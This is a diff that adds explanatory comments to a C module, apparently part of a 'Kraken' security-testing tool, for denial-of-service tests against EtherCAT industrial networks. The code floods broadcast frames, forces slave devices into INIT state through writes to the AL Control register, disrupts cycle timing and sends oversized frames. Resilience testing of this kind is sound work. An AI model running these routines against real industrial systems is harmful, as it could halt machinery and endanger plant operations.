@@ -1,3 +1,5 @@
+// EtherCAT DoS Module
+// Tests master's resilience to denial of service attacks
 
 #include <stdio.h>
 #include <stdlib.h>
@@ -10,6 +12,8 @@
 
 #define ECAT_TYPE 1
 
+// Kraken signature for Wireshark filtering: "KRKN" = 0x4B524B4E
+// Filter in Wireshark: frame contains "KRKN"
 #define KRAKEN_SIG "KRKN"
 #define KRAKEN_SIG_LEN 4
 
@@ -31,7 +35,7 @@ static size_t build_frame(uint8_t *buf, uint8_t cmd, uint16_t addr, uint16_t off
     buf[9] = (len_flags >> 8) & 0xFF;
     buf[10] = 0;
     buf[11] = 0;
-   
+    // Kraken signature first
     memcpy(buf + 12, KRAKEN_SIG, KRAKEN_SIG_LEN);
     if (data && data_len > 0) {
         memcpy(buf + 12 + KRAKEN_SIG_LEN, data, data_len);
@@ -43,11 +47,12 @@ static size_t build_frame(uint8_t *buf, uint8_t cmd, uint16_t addr, uint16_t off
     return 2 + frame_len;
 }
 
+// Test 1: High-rate frame flood
 static int test_flood(KrakenConnectionHandle conn, const KrakenConnectionOps *ops,
                       KrakenRunResultV2 *result, int duration_ms) {
     uint8_t frame[64];
     uint8_t data[2] = {0};
-    size_t len = build_frame(frame, 7, 0, 0, data, 2, 0);
+    size_t len = build_frame(frame, 7, 0, 0, data, 2, 0); // BRD
 
     int sent = 0;
     clock_t start = clock();
@@ -65,12 +70,13 @@ static int test_flood(KrakenConnectionHandle conn, const KrakenConnectionOps *op
     return sent;
 }
 
+// Test 2: State change attack - try to force slaves to INIT
 static int test_state_change(KrakenConnectionHandle conn, const KrakenConnectionOps *ops,
                              KrakenRunResultV2 *result) {
     uint8_t frame[64];
-   
-    uint8_t data[2] = {0x01, 0x00};
-    size_t len = build_frame(frame, 8, 0, 0x0120, data, 2, 0);
+    // BWR to AL Control (0x0120) with INIT state (0x01)
+    uint8_t data[2] = {0x01, 0x00}; // Request INIT state
+    size_t len = build_frame(frame, 8, 0, 0x0120, data, 2, 0); // BWR
 
     int sent = 0;
     for (int i = 0; i < 50; i++) {
@@ -84,6 +90,7 @@ static int test_state_change(KrakenConnectionHandle conn, const KrakenConnection
     return sent;
 }
 
+// Test 3: Timing disruption - send frames with varying intervals
 static int test_timing_disruption(KrakenConnectionHandle conn, const KrakenConnectionOps *ops,
                                   KrakenRunResultV2 *result) {
     uint8_t frame[64];
@@ -91,13 +98,13 @@ static int test_timing_disruption(KrakenConnectionHandle conn, const KrakenConne
     size_t len = build_frame(frame, 7, 0, 0, data, 2, 0);
 
     int sent = 0;
-   
+    // Burst-pause pattern to disrupt cycle timing
     for (int burst = 0; burst < 10; burst++) {
-       
+        // Fast burst
         for (int i = 0; i < 20; i++) {
             if (ops->send(conn, frame, len, 1) > 0) sent++;
         }
-       
+        // Pause (busy wait ~5ms)
         clock_t pause_end = clock() + (5 * CLOCKS_PER_SEC / 1000);
         while (clock() < pause_end) {}
     }
@@ -109,6 +116,7 @@ static int test_timing_disruption(KrakenConnectionHandle conn, const KrakenConne
     return sent;
 }
 
+// Test 4: Large frame attack
 static int test_large_frames(KrakenConnectionHandle conn, const KrakenConnectionOps *ops,
                              KrakenRunResultV2 *result) {
     uint8_t frame[1500];
